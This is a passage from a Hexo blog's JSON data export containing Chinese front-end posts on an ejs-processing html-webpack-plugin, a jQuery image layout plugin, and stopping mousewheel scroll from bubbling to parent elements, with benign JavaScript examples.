events:</h4>\n<p>Async:</p>\n<ul>\n<li>html-webpack-plugin-before-html-generation</li>\n<li>html-webpack-plugin-before-html-processing</li>\n<li>html-webpack-plugin-alter-asset-tags</li>\n<li>html-webpack-plugin-after-html-processing</li>\n<li>html-webpack-plugin-after-emit</li>\n</ul>\n<p>Sync:</p>\n<ul>\n<li>html-webpack-plugin-alter-chunks</li>\n</ul>\n<p>这些事件都是在<code>html-webpack-plugin</code>整个生命周期中发生的，还有一些官方没有提到的，在源码里可以找到，不过对于目前来说用处不大，在这里我们用<code>html-webpack-plugin-before-html-processing</code>，就是在html加工前，我们要对里面的ejs语法进行处理，代码如下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ejs = <span class=\"built_in\">require</span>( <span class=\"string\">'ejs'</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HtmlEjsWebpackPlugin</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  apply( compiler ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    compiler.plugin( <span class=\"string\">'compilation'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> compilation </span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      compilation.plugin( <span class=\"string\">'html-webpack-plugin-before-html-processing'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> htmlPluginData, callback </span>) </span>&#123;</span><br><span class=\"line\">        htmlPluginData.html = ejs.render( htmlPluginData.html, &#123;</span><br><span class=\"line\">          customData: htmlPluginData.plugin.options.customData || &#123;&#125;</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">        callback( <span class=\"literal\">null</span>, htmlPluginData );</span><br><span class=\"line\">      &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这里的customData是我们的自定义数据，比如title keywords等，用来静态生成html内容。然后就是html-loader，为了方便，我们可以直接声明一个nodejs的全局函数:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 声明一个全局的ejsrennder函数</span></span><br><span class=\"line\">global.ejsRender = ejs.render;</span><br></pre></td></tr></table></figure>\n<p>这样我们就可以在html代码里这样写</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">$&#123;ejsRender( require('$d/js/components/search_material.html'), &#123; title: '账号' &#125; )&#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>这样我们可以去html里取到传进去的变量</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">title</span> %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>输出</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>账号<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这样变量相关的我们就处理完了，还有一个比较重要的是html的parse，对于一些嵌套了后端写法的地方，html-minifier是无法解析的，比如：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a &lt;if condition=\"$bannerItem['activity_url']\"&gt;href=\"&#123;$bannerItem['activity_url']&#125;\" &#123;$bannerItem['isblankopen'] == '1' ? 'target=\"_blank\"' : ''&#125;&lt;/if&gt;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>再比如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"__RESPATH__/images/hy&#123;$_SESSION['vip']|default='0'&#125;.png\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"vip-logo\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"vip标识\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>所以我们再看文档<code>ignoreCustomFragments</code>、<code>customAttrSurround</code>、<code>customAttrAssign</code>我们需要配置这些属性，它会传给html-minifier。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  ignoreCustomFragments: [ <span class=\"regexp\">/&lt;if[\\s\\S]*?&gt;[\\s\\S]*?&lt;\\/if&gt;/</span>, /<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">%[\\s\\S]*?%</span>&gt;</span>/, /\\&#123;\\$[\\s\\S]*?\\&#125;/, /\\&#123;\\:[\\s\\S]*?\\&#125;/ ],</span></span><br><span class=\"line\"><span class=\"xml\">  customAttrSurround: [</span></span><br><span class=\"line\"><span class=\"xml\">    [ /\\&#123;\\$/, /\\&#125;/ ],</span></span><br><span class=\"line\"><span class=\"xml\">    [ /<span class=\"tag\">&lt;<span class=\"name\">if[\\s\\S]*?</span>&gt;</span>/, /<span class=\"tag\">&lt;<span class=\"name\">\\</span>/<span class=\"attr\">if</span>&gt;</span>/ ]</span></span><br><span class=\"line\"><span class=\"xml\">  ],</span></span><br><span class=\"line\"><span class=\"xml\">  customAttrAssign: [ /\\&#123;\\$[\\s\\S]*?\\&#125;/, /\\&#123;\\:[\\s\\S]*?\\&#125;/ ]</span></span><br><span class=\"line\"><span class=\"xml\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>就是指定规则的内容不检查，直接跳过，html-minifier的文档里有详细的说明。<br>\n这样一来我们就可以完全将前后端文件拆开来了，不用受后端限制非得放在哪个文件夹，因为nodejs已经帮我们做了（html-webpack-plugin配合html-webpack-harddisk-plugin插件）。</p>\n"},{"title":"基于jQuery的轻量图片排版插件","catalog":true,"date":"2017-06-21T14:32:33.000Z","subtitle":"一个轻量的图片排版插件","header-img":"post/IMG_2454.JPG","_content":"\n之前因为公司项目需要，一个页面图片挺多的，并且图片的分辨率完全随机，这就对页面排版要求挺高的，目前最流行的解决方案就是使用纵向瀑布流。但是因为图片加载都是异步的，js插件在获取图片容器宽高时往往得到的都是还没完全加载的值，导致并不能达到需求要的效果。于是便抽业余时间写了这个插件，虽然最后因为种种原因没有用到这个插件，但是毕竟是自己付之劳动的成果于是就作了个记录 话不多说 直接上效果图\n\n![效果图](result.jpg)\n\n效果还是不赖吧 >_>\n\n> 下面是一些配置参数能简单改变排版\n\n* `x`: 对于每个排版的margin-right，`默认5px`;\n* `y`: 对于每个排版的margin-bottom，`默认5px`;\n* `target`: 相对于选择器的目标元素，`默认>*`;\n* `widthOffset`: 随机宽度偏移量，值越大每个项目的最大最小宽度差值越大，`默认50`（PS：过大或负数可能会造成crush）;\n* `horizontalSize`: 每行的列数，`默认4`;\n* `autoFullColumns`: 最后一行如果个数不满`horizontalSize`配置的个数，是否自动填充宽度，`默认false`;\n* `substractPx`: 在某些视网膜屏上，因为宽度的计算丢失精度导致每行项目的最后一个掉到下一行，造成crush，所以这个参数是在原来的基础上修复这个问题，一般情况不会用到这个配置项，`默认1px`;\n\n***\n`horizontalSize`为5的预览效果\n![效果图](result2.jpg)\n***\n`autoFullColumns`为true的预览效果\n![效果图](result3.jpg)\n`x、y`为1的预览效果\n![效果图](result4.jpg)\n***\n\n仓库地址[jQuery retract](https://github.com/Ryuurock/jQuery.retract)\n\n其实插件本什么有很多不足，比如遇到人像图很可能会造成“切头切脚”的情况，因为本身使用的background-image属性展示图片，并且background-size: cover，这就造成了很多地方看不到了，最好的解决方案是使用img标签来展示，并且根据给定的一个高度来动态计算出一行图片的宽高（ps：因为图片的宽高都不等，无法做到高度一定，在给定高度后任然会在这个值左右浮动），使其正好能填充一行，这样便不会造成“切头切脚”的情况了，前提是你要提前知道这些图片的宽高，或者的等到至少一组以上的图片宽高都加载到了才行。参照[百度图片](https://image.baidu.com/search/index?tn=baiduimage&ipn=r&ct=201326592&cl=2&lm=-1&st=-1&fr=&sf=1&fmq=1459502303089_R&pv=&ic=0&nc=1&z=&se=1&showtab=0&fb=0&width=&height=&face=0&istype=2&ie=utf-8&word=%E9%A3%8E%E6%99%AF)的效果也许您就明白了。\n\n可是万恶的百度这个组件代码是压缩的，而且并不抽象，并不抽象，并不抽象！鉴于压缩代码实在是很难一时间看明白，于是我就放弃了。\n\n其实对于上面的需求，是有一个完美的插件的[Justified-Gallery](https://github.com/miromannino/Justified-Gallery) 不管你是否提前拥有图片宽高，它都能完美加载排版出一个“画廊”，并且支持图片预览。大神的技术真的要学习啊 /笑哭。\n\n另外还是放上我这个项目的地址吧[jQuery-pulgin-retract]()\n\n","source":"_posts/jQuery-pulgin-retract.md","raw":"---\ntitle: 基于jQuery的轻量图片排版插件\ncatalog: true\ndate: 2017-06-21 22:32:33\nsubtitle: 一个轻量的图片排版插件\nheader-img: post/IMG_2454.JPG\ntags:\n- jQuery plugin\n- javascript\n---\n\n之前因为公司项目需要，一个页面图片挺多的，并且图片的分辨率完全随机，这就对页面排版要求挺高的，目前最流行的解决方案就是使用纵向瀑布流。但是因为图片加载都是异步的，js插件在获取图片容器宽高时往往得到的都是还没完全加载的值，导致并不能达到需求要的效果。于是便抽业余时间写了这个插件，虽然最后因为种种原因没有用到这个插件，但是毕竟是自己付之劳动的成果于是就作了个记录 话不多说 直接上效果图\n\n![效果图](result.jpg)\n\n效果还是不赖吧 >_>\n\n> 下面是一些配置参数能简单改变排版\n\n* `x`: 对于每个排版的margin-right，`默认5px`;\n* `y`: 对于每个排版的margin-bottom，`默认5px`;\n* `target`: 相对于选择器的目标元素，`默认>*`;\n* `widthOffset`: 随机宽度偏移量，值越大每个项目的最大最小宽度差值越大，`默认50`（PS：过大或负数可能会造成crush）;\n* `horizontalSize`: 每行的列数，`默认4`;\n* `autoFullColumns`: 最后一行如果个数不满`horizontalSize`配置的个数，是否自动填充宽度，`默认false`;\n* `substractPx`: 在某些视网膜屏上，因为宽度的计算丢失精度导致每行项目的最后一个掉到下一行，造成crush，所以这个参数是在原来的基础上修复这个问题，一般情况不会用到这个配置项，`默认1px`;\n\n***\n`horizontalSize`为5的预览效果\n![效果图](result2.jpg)\n***\n`autoFullColumns`为true的预览效果\n![效果图](result3.jpg)\n`x、y`为1的预览效果\n![效果图](result4.jpg)\n***\n\n仓库地址[jQuery retract](https://github.com/Ryuurock/jQuery.retract)\n\n其实插件本什么有很多不足，比如遇到人像图很可能会造成“切头切脚”的情况，因为本身使用的background-image属性展示图片，并且background-size: cover，这就造成了很多地方看不到了，最好的解决方案是使用img标签来展示，并且根据给定的一个高度来动态计算出一行图片的宽高（ps：因为图片的宽高都不等，无法做到高度一定，在给定高度后任然会在这个值左右浮动），使其正好能填充一行，这样便不会造成“切头切脚”的情况了，前提是你要提前知道这些图片的宽高，或者的等到至少一组以上的图片宽高都加载到了才行。参照[百度图片](https://image.baidu.com/search/index?tn=baiduimage&ipn=r&ct=201326592&cl=2&lm=-1&st=-1&fr=&sf=1&fmq=1459502303089_R&pv=&ic=0&nc=1&z=&se=1&showtab=0&fb=0&width=&height=&face=0&istype=2&ie=utf-8&word=%E9%A3%8E%E6%99%AF)的效果也许您就明白了。\n\n可是万恶的百度这个组件代码是压缩的，而且并不抽象，并不抽象，并不抽象！鉴于压缩代码实在是很难一时间看明白，于是我就放弃了。\n\n其实对于上面的需求，是有一个完美的插件的[Justified-Gallery](https://github.com/miromannino/Justified-Gallery) 不管你是否提前拥有图片宽高，它都能完美加载排版出一个“画廊”，并且支持图片预览。大神的技术真的要学习啊 /笑哭。\n\n另外还是放上我这个项目的地址吧[jQuery-pulgin-retract]()\n\n","slug":"jQuery-pulgin-retract","published":1,"updated":"2017-07-01T03:38:32.317Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000ji4ucl4sqvwbn","content":"<p>之前因为公司项目需要，一个页面图片挺多的，并且图片的分辨率完全随机，这就对页面排版要求挺高的，目前最流行的解决方案就是使用纵向瀑布流。但是因为图片加载都是异步的，js插件在获取图片容器宽高时往往得到的都是还没完全加载的值，导致并不能达到需求要的效果。于是便抽业余时间写了这个插件，虽然最后因为种种原因没有用到这个插件，但是毕竟是自己付之劳动的成果于是就作了个记录 话不多说 直接上效果图</p>\n<p><img src=\"result.jpg\" alt=\"效果图\"></p>\n<p>效果还是不赖吧 &gt;_&gt;</p>\n<blockquote>\n<p>下面是一些配置参数能简单改变排版</p>\n</blockquote>\n<ul>\n<li><code>x</code>: 对于每个排版的margin-right，<code>默认5px</code>;</li>\n<li><code>y</code>: 对于每个排版的margin-bottom，<code>默认5px</code>;</li>\n<li><code>target</code>: 相对于选择器的目标元素，<code>默认&gt;*</code>;</li>\n<li><code>widthOffset</code>: 随机宽度偏移量，值越大每个项目的最大最小宽度差值越大，<code>默认50</code>（PS：过大或负数可能会造成crush）;</li>\n<li><code>horizontalSize</code>: 每行的列数，<code>默认4</code>;</li>\n<li><code>autoFullColumns</code>: 最后一行如果个数不满<code>horizontalSize</code>配置的个数，是否自动填充宽度，<code>默认false</code>;</li>\n<li><code>substractPx</code>: 在某些视网膜屏上，因为宽度的计算丢失精度导致每行项目的最后一个掉到下一行，造成crush，所以这个参数是在原来的基础上修复这个问题，一般情况不会用到这个配置项，<code>默认1px</code>;</li>\n</ul>\n<hr>\n<p><code>horizontalSize</code>为5的预览效果<br>\n<img src=\"result2.jpg\" alt=\"效果图\"></p>\n<hr>\n<p><code>autoFullColumns</code>为true的预览效果<br>\n<img src=\"result3.jpg\" alt=\"效果图\"><br>\n<code>x、y</code>为1的预览效果<br>\n<img src=\"result4.jpg\" alt=\"效果图\"></p>\n<hr>\n<p>仓库地址<a href=\"https://github.com/Ryuurock/jQuery.retract\" target=\"_blank\" rel=\"noopener\">jQuery retract</a></p>\n<p>其实插件本什么有很多不足，比如遇到人像图很可能会造成“切头切脚”的情况，因为本身使用的background-image属性展示图片，并且background-size: cover，这就造成了很多地方看不到了，最好的解决方案是使用img标签来展示，并且根据给定的一个高度来动态计算出一行图片的宽高（ps：因为图片的宽高都不等，无法做到高度一定，在给定高度后任然会在这个值左右浮动），使其正好能填充一行，这样便不会造成“切头切脚”的情况了，前提是你要提前知道这些图片的宽高，或者的等到至少一组以上的图片宽高都加载到了才行。参照<a href=\"https://image.baidu.com/search/index?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fr=&amp;sf=1&amp;fmq=1459502303089_R&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;word=%E9%A3%8E%E6%99%AF\" target=\"_blank\" rel=\"noopener\">百度图片</a>的效果也许您就明白了。</p>\n<p>可是万恶的百度这个组件代码是压缩的，而且并不抽象，并不抽象，并不抽象！鉴于压缩代码实在是很难一时间看明白，于是我就放弃了。</p>\n<p>其实对于上面的需求，是有一个完美的插件的<a href=\"https://github.com/miromannino/Justified-Gallery\" target=\"_blank\" rel=\"noopener\">Justified-Gallery</a> 不管你是否提前拥有图片宽高，它都能完美加载排版出一个“画廊”，并且支持图片预览。大神的技术真的要学习啊 /笑哭。</p>\n<p>另外还是放上我这个项目的地址吧<a href=\"\">jQuery-pulgin-retract</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前因为公司项目需要，一个页面图片挺多的，并且图片的分辨率完全随机，这就对页面排版要求挺高的，目前最流行的解决方案就是使用纵向瀑布流。但是因为图片加载都是异步的，js插件在获取图片容器宽高时往往得到的都是还没完全加载的值，导致并不能达到需求要的效果。于是便抽业余时间写了这个插件，虽然最后因为种种原因没有用到这个插件，但是毕竟是自己付之劳动的成果于是就作了个记录 话不多说 直接上效果图</p>\n<p><img src=\"result.jpg\" alt=\"效果图\"></p>\n<p>效果还是不赖吧 &gt;_&gt;</p>\n<blockquote>\n<p>下面是一些配置参数能简单改变排版</p>\n</blockquote>\n<ul>\n<li><code>x</code>: 对于每个排版的margin-right，<code>默认5px</code>;</li>\n<li><code>y</code>: 对于每个排版的margin-bottom，<code>默认5px</code>;</li>\n<li><code>target</code>: 相对于选择器的目标元素，<code>默认&gt;*</code>;</li>\n<li><code>widthOffset</code>: 随机宽度偏移量，值越大每个项目的最大最小宽度差值越大，<code>默认50</code>（PS：过大或负数可能会造成crush）;</li>\n<li><code>horizontalSize</code>: 每行的列数，<code>默认4</code>;</li>\n<li><code>autoFullColumns</code>: 最后一行如果个数不满<code>horizontalSize</code>配置的个数，是否自动填充宽度，<code>默认false</code>;</li>\n<li><code>substractPx</code>: 在某些视网膜屏上，因为宽度的计算丢失精度导致每行项目的最后一个掉到下一行，造成crush，所以这个参数是在原来的基础上修复这个问题，一般情况不会用到这个配置项，<code>默认1px</code>;</li>\n</ul>\n<hr>\n<p><code>horizontalSize</code>为5的预览效果<br>\n<img src=\"result2.jpg\" alt=\"效果图\"></p>\n<hr>\n<p><code>autoFullColumns</code>为true的预览效果<br>\n<img src=\"result3.jpg\" alt=\"效果图\"><br>\n<code>x、y</code>为1的预览效果<br>\n<img src=\"result4.jpg\" alt=\"效果图\"></p>\n<hr>\n<p>仓库地址<a href=\"https://github.com/Ryuurock/jQuery.retract\" target=\"_blank\" rel=\"noopener\">jQuery retract</a></p>\n<p>其实插件本什么有很多不足，比如遇到人像图很可能会造成“切头切脚”的情况，因为本身使用的background-image属性展示图片，并且background-size: cover，这就造成了很多地方看不到了，最好的解决方案是使用img标签来展示，并且根据给定的一个高度来动态计算出一行图片的宽高（ps：因为图片的宽高都不等，无法做到高度一定，在给定高度后任然会在这个值左右浮动），使其正好能填充一行，这样便不会造成“切头切脚”的情况了，前提是你要提前知道这些图片的宽高，或者的等到至少一组以上的图片宽高都加载到了才行。参照<a href=\"https://image.baidu.com/search/index?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fr=&amp;sf=1&amp;fmq=1459502303089_R&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;word=%E9%A3%8E%E6%99%AF\" target=\"_blank\" rel=\"noopener\">百度图片</a>的效果也许您就明白了。</p>\n<p>可是万恶的百度这个组件代码是压缩的，而且并不抽象，并不抽象，并不抽象！鉴于压缩代码实在是很难一时间看明白，于是我就放弃了。</p>\n<p>其实对于上面的需求，是有一个完美的插件的<a href=\"https://github.com/miromannino/Justified-Gallery\" target=\"_blank\" rel=\"noopener\">Justified-Gallery</a> 不管你是否提前拥有图片宽高，它都能完美加载排版出一个“画廊”，并且支持图片预览。大神的技术真的要学习啊 /笑哭。</p>\n<p>另外还是放上我这个项目的地址吧<a href=\"\">jQuery-pulgin-retract</a></p>\n"},{"title":"如何完美阻止浏览器的滚动事件向上冒泡","catalog":true,"date":"2017-06-19T13:06:52.000Z","subtitle":null,"header-img":"post/IMG_2438.JPG","keyword":"事件,javascript","catagories":["javascript"],"_content":"\n我们都知道，浏览器的事件一般是从元素的一层一层网上冒泡的(`document.addEventListener`方法的第三个参数设置为`true`则是冒泡, `false`则是捕获)，鼠标的滚轮事件也不例外，当某个滚动区域的内容滚动到最底部时，则会往上走，找到最近的父元素，继续滚动。在某些时候这是个很不错的设定，但是当页面的可滚动区域过多的时候，便会造成不好的用户体验。给人以“到处都在动”的感觉，可能你马上会想到`event.stopPropagation()`这个方法，但是你可以先试试有用吗。#滑稽#\n\n没错，我也是试了之后发现根本没什么卵用，所以就在网上找  代码如下：（摘自[http://blog.csdn.net/jyy_12/article/details/6878049](http://blog.csdn.net/jyy_12/article/details/6878049)）:\n```javascript\n$.fn.extend( {\n  preventScroll: function() {\n    $( this ).each( function() {\n      var _this = this;\n      if ( navigator.userAgent.indexOf( 'Firefox' ) >= 0 ) { //firefox  \n        _this.addEventListener( 'DOMMouseScroll', function( e ) {\n          _this.scrollTop += e.detail > 0 ? 60 : -60;\n          e.preventDefault();\n        }, false );\n      } else {\n        _this.onmousewheel = function( e ) {\n          e = e || window.event;\n          _this.scrollTop += e.wheelDelta > 0 ? -60 : 60;\n          return false;\n        };\n      }\n    } )\n  }\n} );\n$( \".box\" ).preventScroll();\n```\n然后问题就这么愉快的解决了！\n于是我便开始愉快的开始测试，是的当当前滚动条滚动到滚动到顶部继续滚动的话，不会导致body或者其他父元素的滚动条继续滚动，但是总觉得哪里没对。不信的童鞋可以直接写代码测试一下。\n\n其他浏览器我没有测试过，用chrome的童鞋肯定发现了，惯性呢？滚动的惯性呢？是的因为`e.preventDefault()`阻止了它的默认滚动行为，改用`this.scrollTop += e.detail > 0 ? 60 : -60`这种编程式的滚动，导致滚动没那么流畅了。肯定有人会说，再继续写代码模拟这个惯性不就好了吗？ 确实可以，但不觉得代价太大了点？是的，肯定有其他的解决办法。其实爱思考的人看到这里早已找到了答案，通过`e.detail`或者`e.wheelDelta`是可以知道鼠标滚轮是在向上还是向下滚动的，`向上滚，滚动到顶部，则e.preventDefault()，向下滚，滚动到最下面，也e.preventDefault()`，于是这个题目就这样完美的解决了，滚动的行为依然是浏览器的默认行为，但是它确实不再向上冒泡了，贴上代码：\n```javascript\n$.fn.extend( {\n  preventScroll: function() {\n    return $( this ).each( function() {\n      var _this = this;\n      if ( navigator.userAgent.toLowerCase().indexOf( \"firefox\" ) > 0 ) {\n        _this.addEventListener( 'DOMMouseScroll', function( e ) {\n          // 滚动到最下面，并且鼠标向上（反正是一直往下拉那个动作）\n          if ( this.scrollTop + this.clientHeight == this.scrollHeight && e.detail > 0 ) {\n            e.preventDefault();\n            e.returnValue = false;\n          }\n          // 滚动到最上面，并且鼠标向下（反正是一直往上拉那个动作）\n          else if ( this.scrollTop === 0 && e.detail < 0 ) {\n            e.preventDefault();\n            e.returnValue = false;\n          }\n        }, false );\n      } else {\n        _this.addEventListener( 'mousewheel', function( e ) {\n          if ( this.scrollTop + this.clientHeight == this.scrollHeight && e.wheelDelta < 0 ) {\n            e.preventDefault();\n            e.returnValue = false;\n          } else if ( this.scrollTop === 0 && e.wheelDelta > 0 ) {\n            e.preventDefault();\n            e.returnValue = false;\n          }\n        }, false );\n      }\n      return this;\n    } );\n  }\n} );\n```\n是的，这个问题就这么完美解决了，可能不是最佳实现，但是确实比上面的代码要更贴近浏览器原来的样子，我们在写代码的时候对于浏览器的默认行为，不管是从代码来说还是用户体验来说，都应该抱着谨慎的态度。","source":"_posts/mousewheel-bubble.md","raw":"---\ntitle: 如何完美阻止浏览器的滚动事件向上冒泡\ncatalog: true\ndate: 2017-06-19 21:06:52\nsubtitle: \nheader-img: post/IMG_2438.JPG\nkeyword: 事件,javascript\ntags:\n- 事件\n- javascript\ncatagories: \n- javascript\n---\n\n我们都知道，浏览器的事件一般是从元素的一层一层网上冒泡的(`document.addEventListener`方法的第三个参数设置为`true`则是冒泡, `false`则是捕获)，鼠标的滚轮事件也不例外，当某个滚动区域的内容滚动到最底部时，则会往上走，找到最近的父元素，继续滚动。在某些时候这是个很不错的设定，但是当页面的可滚动区域过多的时候，便会造成不好的用户体验。给人以“到处都在动”的感觉，可能你马上会想到`event.stopPropagation()`这个方法，但是你可以先试试有用吗。#滑稽#\n\n没错，我也是试了之后发现根本没什么卵用，所以就在网上找  代码如下：（摘自[http://blog.csdn.net/jyy_12/article/details/6878049](http://blog.csdn.net/jyy_12/article/details/6878049)）:\n```javascript\n$.fn.extend( {\n  preventScroll: function() {\n    $( this ).each( function() {\n      var _this = this;\n      if ( navigator.userAgent.indexOf( 'Firefox' ) >= 0 ) { //firefox  \n        _this.addEventListener( 'DOMMouseScroll', function( e ) {\n          _this.scrollTop += e.detail > 0 ? 60 : -60;\n          e.preventDefault();\n        }, false );\n      } else {\n        _this.onmousewheel = function( e ) {\n          e = e || window.event;\n          _this.scrollTop += e.wheelDelta > 0 ? -60 : 60;\n          return false;\n        };\n      }\n    } )\n  }\n} );\n$( \".box\" ).preventScroll();\n```\n然后问题就这么愉快的解决了！\n于是我便开始愉快的开始测试，是的当当前滚动条滚动到滚动到顶部继续滚动的话，不会导致body或者其他父元素的滚动条继续滚动，但是总觉得哪里没对。不信的童鞋可以直接写代码测试一下。\n\n其他浏览器我没有测试过，用chrome的童鞋肯定发现了，惯性呢？滚动的惯性呢？是的因为`e.preventDefault()`阻止了它的默认滚动行为，改用`this.scrollTop += e.detail > 0 ? 60 : -60`这种编程式的滚动，导致滚动没那么流畅了。肯定有人会说，再继续写代码模拟这个惯性不就好了吗？ 确实可以，但不觉得代价太大了点？是的，肯定有其他的解决办法。其实爱思考的人看到这里早已找到了答案，通过`e.detail`或者`e.wheelDelta`是可以知道鼠标滚轮是在向上还是向下滚动的，`向上滚，滚动到顶部，则e.preventDefault()，向下滚，滚动到最下面，也e.preventDefault()`，于是这个题目就这样完美的解决了，滚动的行为依然是浏览器的默认行为，但是它确实不再向上冒泡了，贴上代码：\n```javascript\n$.fn.extend( {\n  preventScroll: function() {\n    return $( this ).each( function() {\n      var _this = this;\n      if ( navigator.userAgent.toLowerCase().indexOf( \"firefox\" ) > 0 ) {\n        _this.addEventListener( 'DOMMouseScroll', function( e ) {\n          // 滚动到最下面，并且鼠标向上（反正是一直往下拉那个动作）\n          if ( this.scrollTop + this.clientHeight == this.scrollHeight && e.detail > 0 ) {\n            e.preventDefault();\n            e.returnValue = false;\n          }\n          // 滚动到最上面，并且鼠标向下（反正是一直往上拉那个动作）\n          else if ( this.scrollTop === 0 && e.detail < 0 ) {\n            e.preventDefault();\n            e.returnValue = false;\n          }\n        }, false );\n      } else {\n        _this.addEventListener( 'mousewheel', function( e ) {\n          if ( this.scrollTop + this.clientHeight == this.scrollHeight && e.wheelDelta < 0 ) {\n            e.preventDefault();\n            e.returnValue = false;\n          } else if ( this.scrollTop === 0 && e.wheelDelta > 0 ) {\n            e.preventDefault();\n            e.returnValue = false;\n          }\n        }, false );\n      }\n      return this;\n    } );\n  }\n} );\n```\n是的，这个问题就这么完美解决了，可能不是最佳实现，但是确实比上面的代码要更贴近浏览器原来的样子，我们在写代码的时候对于浏览器的默认行为，不管是从代码来说还是用户体验来说，都应该抱着谨慎的态度。","slug":"mousewheel-bubble","published":1,"updated":"2017-07-01T03:38:32.375Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000li4ucvmyc3yb8","content":"<p>我们都知道，浏览器的事件一般是从元素的一层一层网上冒泡的(<code>document.addEventListener</code>方法的第三个参数设置为<code>true</code>则是冒泡, <code>false</code>则是捕获)，鼠标的滚轮事件也不例外，当某个滚动区域的内容滚动到最底部时，则会往上走，找到最近的父元素，继续滚动。在某些时候这是个很不错的设定，但是当页面的可滚动区域过多的时候，便会造成不好的用户体验。给人以“到处都在动”的感觉，可能你马上会想到<code>event.stopPropagation()</code>这个方法，但是你可以先试试有用吗。#滑稽#</p>\n<p>没错，我也是试了之后发现根本没什么卵用，所以就在网上找  代码如下：（摘自<a href=\"http://blog.csdn.net/jyy_12/article/details/6878049\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/jyy_12/article/details/6878049</a>）:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span 